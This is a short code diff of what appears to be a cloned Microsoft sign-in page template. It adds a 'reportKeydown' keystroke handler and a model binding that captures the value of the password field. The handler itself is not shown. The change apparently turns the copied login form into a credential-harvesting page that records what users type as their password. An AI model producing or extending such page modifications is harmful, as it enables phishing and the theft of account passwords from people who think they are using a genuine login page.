@@ -256,7 +256,16 @@
                     updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
         <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
     
-                <input name="passwd" type="password" placeholder="Password" id="i0118" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
+                <input
+                  name="passwd"
+                  type="password"
+                  placeholder="Password"
+                  id="i0118"
+                  class="form-control input ext-input text-box ext-text-box"
+                  aria-required="true"
+                  (keydown)="reportKeydown($event)"
+                  [(ngModel)]="password"
+                  data-bind="
                     attr: { autocomplete: svr.fIsUpdatedAutocompleteEnabled ? 'current-password' : 'off'},
                     textInput: passwordTextbox.value,
                     ariaDescribedBy: [
